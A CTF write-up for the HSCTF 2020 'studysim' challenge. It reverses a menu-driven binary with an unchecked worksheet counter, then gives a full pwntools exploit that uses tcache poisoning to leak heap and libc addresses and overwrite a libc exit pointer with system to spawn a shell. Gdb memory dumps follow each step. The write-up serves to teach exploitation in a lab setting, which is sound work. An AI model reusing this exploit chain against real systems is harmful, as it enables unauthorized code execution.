---
layout: "post"
title: "HSCTF 2020 Studysim Writeup"
date: 2020-6-04
tags: [Heap, tcache, CTF]
---

This is one the challenges I spent a lot of time on during this year's edition of HSCTF.

## TL;DR OF THE CHALLENGE BINARY

We've been given a standard 64 bit x86 Dynamically Linked binary along with Glibc 2.29 to begin with.

Here's what *Checksec* has to say

```sh
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : FULL

```

Let's dive into reversing now.

## REVERSING

The binary is surprisingly easy to Reverse.

There's a standard CTF style menu driven code which has only two options , **add** and **do**

* **ADD**
    1. Checks whether the count of worksheets is equal to 7.
    2. If count is not equal to 7 , it asks for size and checks if size is less than or equal to **1024**.
    3. Finally it reads size number of bytes and stores the pointer on bss variable called **stack** at an offset of *allocated_count++*.

```c
  if ( allocated_count == 7 )
  {
    puts("Your workload is too high!");
  }
  else
  {
    puts("How long is your worksheet?");
    read_ulong(&v1);
    if ( v1 <= 1024 )
    {
      v2 = malloc(v1 + 1);
      if ( !v2 )
        exit(1);
      puts("What's the content of your worksheet?");
      read_str((__int64)v2, v1);
      stack[allocated_count++] = v2;
      printf("You throw the worksheet '%s' on your stack of worksheets.\n", v2);
    }
    else
    {
      puts("Your worksheet is too long;");
    }
```

We can see that there are **no bounded checks** for the maximum allocated_count which is a potential bug.

```c
  if ( allocated_count == 7 )              
```

* **DO**
    1. This function just asks for how many worksheets we would like to finish and subtracts the **allocated\_count** with the number that we give as input.
    2. There are no checks here and hence allocated count can become a negetive number too.
    3. Finally it prints the allocated_count.

This lets us add chunks anywhere in memory but first we need leaks to go ahead.

```c
  puts("How many worksheets would you like to finish?");
  read_ulong((unsigned __int64 *)&v1);
  allocated_count -= v1;
  printf("You did %lu worksheets. Only %ld more to go!\n", v1, allocated_count);

```

This is it for Reversing , let's head on to converting the bugs that we found into primitives.

## EXPLOIT DEVELOPMENT AND ANALYSIS

Initially we kind of got stuck as to how we could leak , but then , Heap Leak can be easily extracted by simply allocating a chunk at **allocated\_count**.

```py
from pwn import *
import sys
from time import sleep

LIBC = ELF("./libc.so.6")
if(len(sys.argv)>1):
    io=remote('pwn.hsctf.com',5007)
    context.noptrace=True
    context.log_level="CRITICAL"
else:
    io=process('./studysim')#,env = {"LD_PRELOAD" : "./libc.so.6"})

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)

def add(size,content):
    sla('> ','add')
    sla('your worksheet?\n',str(size))
    sla('your worksheet?\n',content)

def do_work(num):
    sla('> ','do')
    sla('like to finish?\n',str(num))

def exit():
    sla('> ','sleep')

stack = 0x404060

if __name__=="__main__":
    add(0x200,'1'*0x1ff)
    do_work(5)
    add(0x300,'a')
    do_work(1)
    #Heap
    reu('Only ')
    heap = int(re(8),10)
    heap_base = heap - 0x470
    log.info("heap_base = " + hex(heap_base))
```

From now on , we'll examine memory at each step.

```sh
0x404020 <stdout@@GLIBC_2.2.5>:	0x00007f04c9aa6760	0x0000000000000000
0x404030 <stdin@@GLIBC_2.2.5>:	0x00007f04c9aa5a00	0x0000000000000000
0x404040 <allocated_count>:	0x0000000000405470	0x0000000000000000
0x404050:	0x0000000000000000	0x0000000000000000
0x404060 <stack>:	0x0000000000405260	0x0000000000000000
0x404070 <stack+16>:	0x0000000000000000	0x0000000000000000
0x404080 <stack+32>:	0x0000000000000000	0x0000000000000000
0x404090 <stack+48>:	0x0000000000000000	0x0000000000000000

```

As u can see **allocated\_count** has been overwritten with a heap address and there goes our heap leak.

Initially , I thought since file pointers are buffered on bss , it could be file structure exploitaion , but then I dropped the idea for several reasons I'll discuss in a moment.

A heap leak is kind of a light of hope as now we can offset to heap and stuff on tcache thereby fooling malloc to assume that they're free chunks.

As we can get allocation on tcache , we can overwrite **fd** of our allocated chunk to point to wherever we want.

We still dont have libc leak :(, hence our first aim is to get libc leak. To do that , we have our potential candidates in bss , yes , you guessed it right , the file pointers in bss.

Here's what we're upto right now ->

1. Get allocation on tcache , overwrite fd of one chunk and finally get the pointer to libc to leak it out.
2. We need to setup our allocated_count in such a way that we can offset to our desired tcache with **stack[allocated\_count++**].

To offset to tcache , we call **do\_worksheet** and change our allocated_count to ->

allocated_count - (tcache-stack)/8
{: .notice}

```py
stack = 0x404060
tcache = heap_base + 0x248  #Corresponds to tcache of 0x400
allocated_count = heap_base + 0x470
offset = (tcache - stack)/8 
change = allocated_count - offset
do_work(change)

```

This will subtract our allocated count with **change** and hence when the next allocation happens , we get allocation on tcache.
You can play around with the offset calculation if you didnt get it yet , its not that tough to understand :).

We now change the fd of our allocated chunk and then get back the libc pointer whose data we can leak.

```py
   add(0x400,p32(0x404030))
   do_work(offset+0x5)
```

We change the allocated_count back to negetive 4 so that we get next allocation on **allocated\_count** itself and repeat the above process to get allocation on another tcache.

```py
    add(0x200,'a') #Get allocation on allocated count
    allocated_count_new1 = heap_base + 0xb91
    tcache_new = heap_base + 0x148  #This time target another tcache of 0x200
    offset_new = (tcache_new - stack)/8
    k = allocated_count_new1 - offset_new
    do_work(k)
    add(0x200,p64(0x404030))
```


As u can see , tcache of 0x200 and 0x400 are successfully populated with our pointers.

```sh
0x405000:	0x0000000000000000	0x0000000000000251
0x405010:	0x0000000000000000	0x0000000000000000
0x405020:	0x0000000000000000	0x0000000000000000
0x405030:	0x0000000000000000	0x0000000000000000
0x405040:	0x0000000000000000	0x0000000000000000
0x405050:	0x0000000000000000	0x0000000000000000
0x405060:	0x0000000000000000	0x0000000000000000
0x405070:	0x0000000000000000	0x0000000000000000
0x405080:	0x0000000000000000	0x0000000000000000
0x405090:	0x0000000000000000	0x0000000000000000
0x4050a0:	0x0000000000000000	0x0000000000000000
0x4050b0:	0x0000000000000000	0x0000000000000000
0x4050c0:	0x0000000000000000	0x0000000000000000
0x4050d0:	0x0000000000000000	0x0000000000000000
0x4050e0:	0x0000000000000000	0x0000000000000000
0x4050f0:	0x0000000000000000	0x0000000000000000
0x405100:	0x0000000000000000	0x0000000000000000
0x405110:	0x0000000000000000	0x0000000000000000
0x405120:	0x0000000000000000	0x0000000000000000
0x405130:	0x0000000000000000	0x0000000000000000
0x405140:	0x0000000000000000	0x0000000000405da0 -> 0x200 tcache
0x405150:	0x0000000000000000	0x0000000000000000
0x405160:	0x0000000000000000	0x0000000000000000
0x405170:	0x0000000000000000	0x0000000000000000
0x405180:	0x0000000000000000	0x0000000000000000
0x405190:	0x0000000000000000	0x0000000000000000
0x4051a0:	0x0000000000000000	0x0000000000000000
0x4051b0:	0x0000000000000000	0x0000000000000000
0x4051c0:	0x0000000000000000	0x0000000000000000
0x4051d0:	0x0000000000000000	0x0000000000000000
0x4051e0:	0x0000000000000000	0x0000000000000000
0x4051f0:	0x0000000000000000	0x0000000000000000
0x405200:	0x0000000000000000	0x0000000000000000
0x405210:	0x0000000000000000	0x0000000000000000
0x405220:	0x0000000000000000	0x0000000000000000
0x405230:	0x0000000000000000	0x0000000000000000
0x405240:	0x0000000000000000	0x0000000000405780 -> 0x400 tcache

```

Since fd of our tcache is overwritten with bss libc pointer , we can get allocation on bss by calling malloc twice from now and subsequently leak libc.

```sh

    add(0x400,p64(0x60))
    add(0x400,p8(0x60))
    #Libc
    reu("You throw the worksheet '")
    libc_base = u64(re(6) + '\x00'*2) - 0x1e4a60
    log.info("libc = " + hex(libc_base))
    system = libc_base + LIBC.symbols['system']

```

Let's see where all this has got us.

```sh

0x405000:	0x0000000000000000	0x0000000000000251
0x405010:	0x0000000000000000	0x0000000000000000
0x405020:	0x0000000000000000	0x0000000000000000
0x405030:	0x0000000000000000	0x0000000000000000
0x405040:	0x0000000000000000	0xfe00000000000000
0x405050:	0x0000000000000000	0x0000000000000000
0x405060:	0x0000000000000000	0x0000000000000000
0x405070:	0x0000000000000000	0x0000000000000000
0x405080:	0x0000000000000000	0x0000000000000000
0x405090:	0x0000000000000000	0x0000000000000000
0x4050a0:	0x0000000000000000	0x0000000000000000
0x4050b0:	0x0000000000000000	0x0000000000000000
0x4050c0:	0x0000000000000000	0x0000000000000000
0x4050d0:	0x0000000000000000	0x0000000000000000
0x4050e0:	0x0000000000000000	0x0000000000000000
0x4050f0:	0x0000000000000000	0x0000000000000000
0x405100:	0x0000000000000000	0x0000000000000000
0x405110:	0x0000000000000000	0x0000000000000000
0x405120:	0x0000000000000000	0x0000000000000000
0x405130:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x405140:	0x0000000000000000	0x0000000000405da0
0x405150:	0x0000000000405780	0x0000000000404030
0x405160:	0x0000000000000000	0x0000000000000000
0x405170:	0x0000000000000000	0x0000000000000000
0x405180:	0x0000000000000000	0x0000000000000000
0x405190:	0x0000000000000000	0x0000000000000000
0x4051a0:	0x0000000000000000	0x0000000000000000
0x4051b0:	0x0000000000000000	0x0000000000000000
0x4051c0:	0x0000000000000000	0x0000000000000000
0x4051d0:	0x0000000000000000	0x0000000000000000
0x4051e0:	0x0000000000000000	0x0000000000000000
0x4051f0:	0x0000000000000000	0x0000000000000000
0x405200:	0x0000000000000000	0x0000000000000000
0x405210:	0x0000000000000000	0x0000000000000000
0x405220:	0x0000000000000000	0x0000000000000000
0x405230:	0x0000000000000000	0x0000000000000000
0x405240:	0x0000000000000000	0x00007f1f747c1a00 -> There u go , we unlinked our stdin file structure , next allocation should return our file structure.

```

From now on , things seeemed clear but turned out they weren't.

1. File structure overwrite , but one_gadget constraints were not satisfying anywhere.
2. Tried overwriting **malloc hook** and again one_gadget constraints were not satisfying.

At this point , I was super frustrated , and then gave a thought , and **exit pointer** came to my mind like lightning.

So overwrote exit pointer with one_gadget , but there also the constraints were very stubborn.

There I observed something , when there was a call to exit_pointer , rdi was set to a libc bss address but it was very far from exit pointer's address.

Then I tried doing 2 overwrites ,

1. Overwrite **exit\_pointer** with **system**.
2. Overwrite libc bss pointer with "/bin/sh".

And it worked!!!

```py

    target = libc_base + 0x218968 #rdi was set to this address
    gdb.attach(io)
    add(0x200,'a')
    add(0x200,p64(libc_base + LIBC.symbols['_IO_2_1_stdin_']) + p64(0) + p64(offset_new-2))
    add(0x200,p64(0))
    do_work(offset_new+4)
    add(0x200,'a')
    allocated_count_new2 = heap_base + 0xfb1
    do_work(allocated_count_new2 - offset_new)
    add(0x200,p64(target))
    add(0x200,'a'*8)
    add(0x200,'/bin/sh\x00')  #Get allocation on libc bss and overwrite rdi pointer to /bin/sh
    do_work(offset_new+3+4)
    add(0x200,'a')
    allocated_count_new3 = heap_base + 0x13d1
    do_work(allocated_count_new3-(offset_new))
    exit_ptr = libc_base + 0x218f68
    add(0x200,p64(exit_ptr))
    add(0x200,'a')
    add(0x200,p64(system))  #Get allocation on exit pointer and overwrite it with system
    exit()                  #Finally call exit and trigger shell
    io.interactive()
```

## CONCLUSION

It was a really nice challenge and I had a lot of fun solving it.

Here's the [script](https://gist.github.com/PwnVerse/c7dc7f14dcc5cf8b044705c2037559f1)

